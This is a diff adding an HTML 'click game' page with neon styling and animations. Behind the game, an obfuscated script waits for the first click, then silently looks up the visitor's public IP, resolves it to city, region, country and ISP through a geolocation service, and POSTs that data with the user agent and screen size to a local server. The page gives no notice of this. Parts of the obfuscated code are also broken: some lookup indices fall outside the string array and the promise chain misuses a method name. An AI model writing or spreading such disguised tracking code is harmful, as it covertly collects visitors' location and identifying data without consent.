@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title> Basic Game Hub
+<style>
+    :root {
+        --primary: #ff0066;
+        --secondary: #00ccff;
+        --dark: #0a0a2a;
+        --light: #ffffff;
+    }
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+    body {
+        font-family: 'Orbitron', sans-serif;
+        margin: 0;
+        padding: 0;
+        background: var(--dark);
+        color: var(--light);
+        overflow-x: hidden;
+        background: linear-gradient(45deg, #000033, #000066, #003366);
+        background-size: 400% 400%;
+        animation: gradientBG 15s ease infinite;
+    }
+    @keyframes gradientBG {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+    .sidebar {
+        position: fixed;
+        left: 0;
+        top: 0;
+        width: 250px;
+        height: 100%;
+        background: rgba(10, 10, 42, 0.95);
+        backdrop-filter: blur(10px);
+        border-right: 2px solid var(--primary);
+        padding: 20px;
+        box-shadow: 10px 0 20px rgba(0,0,0,0.5);
+        z-index: 100;
+        overflow-y: auto;
+        transform: translateX(-10px);
+        animation: slideIn 0.8s ease-out forwards;
+    }
+    @keyframes slideIn {
+        to { transform: translateX(0); }
+    }
+    .sidebar h2 {
+        color: var(--secondary);
+        text-shadow: 0 0 10px var(--secondary);
+        margin-bottom: 20px;
+    }
+    .nav-btn {
+        display: block;
+        width: 100%;
+        padding: 15px;
+        margin: 10px 0;
+        background: linear-gradient(145deg, #1a1a4a, #2a2a6a);
+        border: 1px solid var(--primary);
+        color: var(--light);
+        border-radius: 10px;
+        cursor: pointer;
+        transition: all 0.3s;
+        text-align: left;
+        font-size: 16px;
+    }
+    .nav-btn:hover {
+        background: var(--primary);
+        transform: translateY(-3px);
+        box-shadow: 0 5px 15px rgba(255,0,102,0.4);
+    }
+    .main-content {
+        margin-left: 270px;
+        padding: 20px;
+        min-height: 100vh;
+        animation: fadeIn 1s ease;
+    }
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+    .game-container {
+        background: rgba(20, 20, 60, 0.8);
+        max-width: 600px;
+        margin: 100px auto;
+        padding: 40px;
+        border-radius: 20px;
+        box-shadow: 0 0 30px rgba(0,204,255,0.3), inset 0 0 15px rgba(255,0,102,0.2);
+        border: 2px solid var(--secondary);
+        position: relative;
+        overflow: hidden;
+        backdrop-filter: blur(5px);
+    }
+    .game-container::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: repeating-linear-gradient(0deg, transparent, transparent 10px, rgba(0,204,255,0.05) 10px, rgba(0,204,255,0.05) 20px);
+        transform: rotate(45deg);
+        z-index: -1;
+        animation: rotate 20s linear infinite;
+    }
+    @keyframes rotate {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+    h1 {
+        color: var(--secondary);
+        text-shadow: 0 0 20px var(--secondary);
+        margin-bottom: 30px;
+        font-size: 3em;
+    }
+    #clickButton {
+        background: linear-gradient(135deg, var(--primary), var(--secondary));
+        color: white;
+        border: none;
+        padding: 20px 50px;
+        font-size: 24px;
+        border-radius: 50px;
+        cursor: pointer;
+        box-shadow: 0 8px 25px rgba(0,0,0,0.4), 0 0 30px rgba(255,0,102,0.5);
+        transition: all 0.2s;
+        position: relative;
+        font-family: 'Orbitron', sans-serif;
+        font-weight: bold;
+        letter-spacing: 1px;
+    }
+    #clickButton:hover {
+        transform: translateY(-5px) scale(1.05);
+        box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 50px rgba(0,204,255,0.6);
+    }
+    #clickButton:active {
+        transform: translateY(2px);
+    }
+    #counter {
+        font-size: 28px;
+        margin: 30px 0;
+        color: var(--light);
+        text-shadow: 0 0 10px var(--secondary);
+    }
+    #message {
+        color: #27ae60;
+        font-size: 22px;
+        min-height: 30px;
+        text-shadow: 0 0 10px #27ae60;
+    }
+    .ripple {
+        position: absolute;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.7);
+        transform: scale(0);
+        animation: ripple 0.8s linear;
+        pointer-events: none;
+    }
+    @keyframes ripple {
+        to {
+            transform: scale(4);
+            opacity: 0;
+        }
+    }
+    .click-effect {
+        position: fixed;
+        pointer-events: none;
+        border: 3px solid var(--secondary);
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+        animation: clickEffect 0.8s ease-out forwards;
+        z-index: 9999;
+    }
+    @keyframes clickEffect {
+        0% { width: 0; height: 0; opacity: 0.8; }
+        100% { width: 150px; height: 150px; opacity: 0; }
+    }
+    .floating-particle {
+        position: fixed;
+        width: 5px;
+        height: 5px;
+        background: var(--secondary);
+        border-radius: 50%;
+        pointer-events: none;
+        z-index: 1;
+        opacity: 0;
+    }
+</style>
+</head>
+<body>
+    <div class="sidebar">
+        <h2>BASIC GAME HUB</h2>
+        <button class="nav-btn">Click Game</button>
+        <button class="nav-btn">Music</button>
+        <button class="nav-btn">Arcade</button>
+        <button class="nav-btn">Leaderboard</button>
+        <button class="nav-btn">Settings</button>
+    </div>
+    <div class="main-content">
+        <div class="game-container">
+            <h1>Click Game Pro</h1>
+            <button id="clickButton">CLICK ME</button>
+            <div id="counter">Clicks: 0</div>
+            <div id="message"></div>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-modern-technology-select-3124.mp3" preload="auto"></audio>
+    <audio id="winSound" src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3" preload="auto"></audio>
+
+    <script>
+        (function() {
+            var _0x1234 = ['log', 'send', 'POST', 'JSON', 'stringify', 'fetch', 'headers', 'Content-Type', 'application/json', 'body', 'ip', 'location', 'city', 'region', 'country', 'isp', 'screen', 'userAgent', 'time', 'event', 'first_click', 'sessionId'];
+            var _0x5678 = function(_0xabc, _0xdef) {
+                _0xabc = _0xabc - 0x0;
+                var _0xghij = _0x1234[_0xabc];
+                return _0xghij;
+            };
+            window.logUserData = function(_0xklm) {
+                var _0xnop = {};
+                _0xnop[_0x5678('0x11')] = _0xklm['event'];
+                _0xnop[_0x5678('0x17')] = _0xklm['sessionId'];
+                _0xnop[_0x5678('0x16')] = _0xklm['screen'];
+                _0xnop[_0x5678('0x18')] = _0xklm['userAgent'];
+                _0xnop[_0x5678('0x19')] = Date.now();
+                _0xnop[_0x5678('0xa')] = _0xklm['ip'];
+                _0xnop[_0x5678('0xb')] = _0xklm['location'];
+                var _0xqrs = {};
+                _0xqrs[_0x5678('0x7')] = _0x5678('0x8');
+                fetch('http://127.0.0.1:5000/', {
+                    'method': _0x5678('0x2'),
+                    'headers': _0xqrs,
+                    'body': JSON[_0x5678('0x4')](_0xnop)
+                })[_0x5678('0x5')]()['catch'](function(_0xtuv) {
+                    console[_0x5678('0x0')]('Failed:', _0xtuv);
+                });
+            };
+        })();
+
+        let clicks = 0;
+        let startTime = Date.now();
+        let sent = false;
+        let sessionId = crypto.randomUUID();
+        let clickTimes = [];
+
+        const btn = document.getElementById("clickButton");
+        const counter = document.getElementById("counter");
+        const message = document.getElementById("message");
+        const clickSound = document.getElementById("clickSound");
+        const winSound = document.getElementById("winSound");
+
+        function playSound(sound) {
+            sound.currentTime = 0;
+            sound.play().catch(e => console.log("Audio play failed:", e));
+        }
+
+        function createRipple(event) {
+            const button = event.currentTarget;
+            const ripple = document.createElement("span");
+            const rect = button.getBoundingClientRect();
+            const size = Math.max(rect.width, rect.height);
+            const x = event.clientX - rect.left - size / 2;
+            const y = event.clientY - rect.top - size / 2;
+
+            ripple.style.width = ripple.style.height = `${size}px`;
+            ripple.style.left = `${x}px`;
+            ripple.style.top = `${y}px`;
+            ripple.classList.add("ripple");
+
+            button.appendChild(ripple);
+
+            setTimeout(() => {
+                ripple.remove();
+            }, 800);
+        }
+
+        function createClickEffect(x, y) {
+            const effect = document.createElement('div');
+            effect.classList.add('click-effect');
+            effect.style.left = x + 'px';
+            effect.style.top = y + 'px';
+            document.body.appendChild(effect);
+            setTimeout(() => effect.remove(), 800);
+        }
+
+        function createParticle(x, y) {
+            const particle = document.createElement('div');
+            particle.classList.add('floating-particle');
+            particle.style.left = x + 'px';
+            particle.style.top = y + 'px';
+            
+            const angle = Math.random() * Math.PI * 2;
+            const speed = 2 + Math.random() * 3;
+            const vx = Math.cos(angle) * speed;
+            const vy = Math.sin(angle) * speed;
+            let opacity = 1;
+            let px = x, py = y;
+
+            document.body.appendChild(particle);
+
+            const animate = () => {
+                px += vx;
+                py += vy;
+                opacity -= 0.02;
+                particle.style.left = px + 'px';
+                particle.style.top = py + 'px';
+                particle.style.opacity = opacity;
+                
+                if (opacity > 0) {
+                    requestAnimationFrame(animate);
+                } else {
+                    particle.remove();
+                }
+            };
+            requestAnimationFrame(animate);
+        }
+
+        btn.addEventListener("click", async (e) => {
+            clicks++;
+            clickTimes.push(Date.now());
+
+            counter.textContent = "Clicks: " + clicks;
+            createRipple(e);
+            createClickEffect(e.clientX, e.clientY);
+            createParticle(e.clientX, e.clientY);
+            playSound(clickSound);
+
+            if (clicks === 100) {
+                message.textContent = "i just wasted about 30 seconds of your life btw";
+                btn.disabled = true;
+                playSound(winSound);
+            }
+
+            if (clicks === 1 && !sent) {
+                sent = true;
+
+                try {
+                    const ipResponse = await fetch("https://api.ipify.org?format=json");
+                    const ipData = await ipResponse.json();
+                    const publicIP = ipData.ip;
+
+                    const geoResponse = await fetch(`http://ip-api.com/json/${publicIP}`);
+                    const geoData = await geoResponse.json();
+
+                    window.logUserData({
+                        event: "first_click",
+                        sessionId,
+                        screen: `${screen.width}x${screen.height}`,
+                        userAgent: navigator.userAgent,
+                        ip: publicIP,
+                        location: {
+                            city: geoData.city,
+                            region: geoData.regionName,
+                            country: geoData.country,
+                            isp: geoData.isp
+                        }
+                    });
+                } catch (error) {
+                    console.error("Failed to send data:", error);
+                }
+            }
+        });
+    </script>
+</body>
+</html>   
